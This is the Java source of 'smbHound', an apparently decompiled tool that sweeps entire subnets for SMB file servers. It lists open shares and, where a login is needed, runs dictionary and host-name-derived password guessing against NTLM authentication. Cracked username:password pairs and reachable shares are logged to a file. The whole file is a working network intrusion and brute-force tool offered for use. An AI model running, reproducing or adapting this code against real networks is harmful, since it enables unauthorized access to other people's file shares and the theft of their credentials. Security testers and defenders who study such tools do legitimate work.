package smbhound.old;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import jcifs.netbios.NbtAddress;
import jcifs.smb.NtlmPasswordAuthentication;
import jcifs.smb.SmbAuthException;
import jcifs.smb.SmbFile;

public class SmbHound {

    public static ArrayList<String> users;
    public static ArrayList<String> passwords;
    private static ExecutorService pool;

    public static void showPic() {
        System.out.println("smbHound V2.4.1 by $h@");
        System.out.println("                      _..._..._");
        System.out.println("                   .-' '::   '::-.");
        System.out.println("                  /    _     _    \\");
        System.out.println("                 /                 \\");
        System.out.println("                ; : \\  _     _   /  ; ");
        System.out.println("                |:' | /o)   (o\\ | .:|");
        System.out.println("                |   |(_/ .-. \\_)| :'|");
        System.out.println("                | .:/   (   )   \\   |");
        System.out.println("                |  ;     '-'     ;:'|");
        System.out.println("                |: |  '   :   '  |  |");
        System.out.println("                |  | ' '  :  ' ' |  |");
        System.out.println("                |  \\      :      /  |");
        System.out.println("         jgs    |:. \\    /^\\    /:' |");
        System.out.println("                |'  /'--`._.`--'\\   |");
        System.out.println("                 '-'             '-'");
    }

    public static void main(String[] args) throws IOException {
        showPic();

        String next = "";

        if (args.length > 0) {
            next = args[0];
        }

        Scanner input = new Scanner(System.in);
        if ((!next.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) && (!next.matches("\\d{1,3}\\.\\d{1,3}"))) {
            System.out.println("[Usage:] smbhound.jar ipset threadcant");
            System.out.println("[Ex:] smbhound.jar 192.168.1 50 (scan subnet 192.168.1.0/24 using 50 threads)");
            System.out.println("[Ex:] smbhound.jar 192.168 200 (scan subnet 192.168.0.0/16 using 200 threads)");
            System.exit(1);
        }

        System.out.println("[ :)] reading dictionary files");

        users = new ArrayList();
        passwords = new ArrayList();
        try {
            Scanner sc = new Scanner(new File("users.list"));
            while (sc.hasNext()) {
                users.add(sc.next());
            }
        } catch (FileNotFoundException ex) {
            System.err.println("[ :(] users.list not found");
            System.exit(1);
        }
        try {
            Scanner sc = new Scanner(new File("passwords.list"));
            while (sc.hasNext()) {
                passwords.add(sc.next());
            }
        } catch (FileNotFoundException ex) {
            System.err.println("[ :(] passowrds.list not found");
            System.exit(1);
        }

        System.out.println("[¬_¬] found " + String.valueOf(users.size()) + " users and " + String.valueOf(passwords.size()) + " passwords making " + String.valueOf(users.size() * passwords.size()) + " combinations to analize");
        System.out.println("[ :)] done reading dictionary files");

        String prefix = next;

        if (args.length > 1) {
            try {
                int cant = Integer.parseInt(args[1]);
                pool = Executors.newFixedThreadPool(cant);
                System.out.println("[ :)] working with " + args[1] + " threads");
            } catch (NumberFormatException e) {
                System.err.println("[ :(] Can't read thread count");
                pool = Executors.newFixedThreadPool(50);
                System.out.println("[ :)] working with 50 threads");
            }
        } else {
            pool = Executors.newFixedThreadPool(50);
            System.out.println("[ :)] working with 50 threads");
        }

        if (next.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) {
            System.out.println("[ :)] starting scan for subnet " + next + ".0/24");
            for (int i = 1; i < 254; i++) {
                String ip = prefix + "." + String.valueOf(i);

                Thread a = new Thread(new activator(ip));
                pool.execute(a);
            }

        } else if (next.matches("\\d{1,3}\\.\\d{1,3}")) {
            System.out.println("[ :)] starting scan for subnet " + next + ".0.0/16");
            for (int i = 1; i < 254; i++) {
                for (int j = 1; j < 254; j++) {
                    String ip = prefix + "." + String.valueOf(i) + "." + String.valueOf(j);

                    Thread a = new Thread(new activator(ip));
                    pool.execute(a);
                }
            }

        }

//        pool.shutdown();
        System.out.println("[ :)] All found smb servers are saved on foundLog.log");
    }

    private static class activator
            implements Runnable {

        private String ip;
        private boolean onerror;
        String[] posfixes = {"-", "_","--","__"};

        public activator(String ip) {
            this.ip = ip;
            this.onerror = false;
        }

        public void run() {
            active();
            if ((!this.onerror)) {
                boolean found = false;
                boolean noname = false;
                try {
                    ArrayList<String> usrs = new ArrayList();
                    String s = NbtAddress.getAllByAddress(this.ip)[0].getHostName().toLowerCase();

                    System.out.println(new StringBuilder().append("[^_^] ").append(this.ip).append(" also named ").append(s).append(" detected active but not open. Dictionary test working.").toString());

                    for (String i : this.posfixes) {
                        if (s.contains(i)) {
                            usrs.add(s.substring(0, s.lastIndexOf(i)));
                            break;
                        }
                    }
                    
                    for (String i : this.posfixes) {
                        if (s.contains(i)) {
                            usrs.add(s.substring(s.indexOf(i)+1, s.length()));
                            break;
                        }
                    }

                    usrs.add(s);

                    for (String i : usrs) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        for (String j : usrs) {
                            if ((found) || (this.onerror)) {
                                break;
                            }
                            if (active(i, j)) {
                                found = true;
                                break;
                            }
                        }
                    }

                    for (String i : usrs) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        if ((active(i, reverse(i))) || (active(i, firstCap(i)))) {
                            found = true;
                        }
                    }

                    for (String i : usrs) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        for (String j : SmbHound.passwords) {
                            if ((found) || (this.onerror)) {
                                break;
                            }
                            if (active(i, j)) {
                                found = true;
                                break;
                            }
                        }
                    }
                } catch (Exception ex) {
                    Iterator i$;
                    String i;
                    noname = true;
                }

                if (noname) {
                    System.out.println(new StringBuilder().append("[^_^] ").append(this.ip).append(" detected active but not open. Dictionary test working.").toString());
                }

                for (String i : SmbHound.users) {
                    if ((found) || (this.onerror)) {
                        break;
                    }
                    for (String j : SmbHound.passwords) {
                        if ((found) || (this.onerror)) {
                            break;
                        }
                        if (active(i, j)) {
                            found = true;
                            break;
                        }
                    }
                }
                String i;
                if (!found) {
                    System.out.println(new StringBuilder().append("[ :(] ").append(this.ip).append(" resisted attack").toString());
                }
            }
        }

        private String reverse(String s) {
            StringBuilder result = new StringBuilder();
            char[] arr$ = s.toCharArray();
            int len$ = arr$.length;
            for (int i$ = 0; i$ < len$; i$++) {
                Character c = Character.valueOf(arr$[i$]);
                result.insert(0, c);
            }
            return result.toString();
        }

        private String firstCap(String s) {
            return new StringBuilder().append(String.valueOf(s.charAt(0)).toUpperCase()).append(s.substring(1)).toString();
        }

        private synchronized void log(String str) throws IOException {
            FileWriter log = new FileWriter(new File("foundLog.log").getAbsoluteFile(), true);
            log.write(new StringBuilder().append(str).append("\n").toString());
            log.close();
        }

        private boolean active() {
            try {
                SmbFile f = new SmbFile("smb://" + this.ip);
                f.connect();
//                System.out.println("[ :D]> smb://" + this.ip);
//                log("smb://" + this.ip);
                for (SmbFile i : f.listFiles()) {
                    try {
                        if (!i.getName().equals("IPC$/")) {
                            i.connect();
                            System.out.println("[ :D]> smb://" + this.ip + "/" + i.getName());
                            log("smb://" + this.ip + "/" + i.getName());
                        }
                    } catch (jcifs.smb.SmbAuthException ex) {
                        Thread a = new Thread(new activator(this.ip + "/" + i.getName()));
                        pool.execute(a);
//                        System.out.println("running activator for "+this.ip + "/" + i.getName());
                    }
                }

                return true;
            } catch (SmbAuthException aex) {
            } catch (IOException ex) {
//                System.out.println(ex.getMessage());
                this.onerror = true;
                return false;
            }

            return false;
        }

        private boolean active(String user, String pass) {
            try {
                SmbFile f = new SmbFile("smb://" + this.ip, new NtlmPasswordAuthentication("", user, pass));
                f.connect();
//                System.out.println("[ :D]> " + user + " <-> " + pass + " <-> smb://" + this.ip);
//                log(user + " <-> " + pass + " <-> smb://" + this.ip);

                for (SmbFile i : f.listFiles()) {
                    try {
                        if (!i.getName().equals("IPC$/")) {
                            i.connect();
                            System.out.println("[ :D]> smb://"+user+":"+pass+ "@" + this.ip + "/" + i.getName());
                            log("[ :D]> smb://"+user+":"+pass+ "@" + this.ip + "/" + i.getName());
                        }
                    } catch (jcifs.smb.SmbAuthException ex) {
                    }
                }

                return true;
            } catch (SmbAuthException aex) {
            } catch (IOException ex) {
                this.onerror = true;
                return false;
            }
            return false;
        }
    }
}
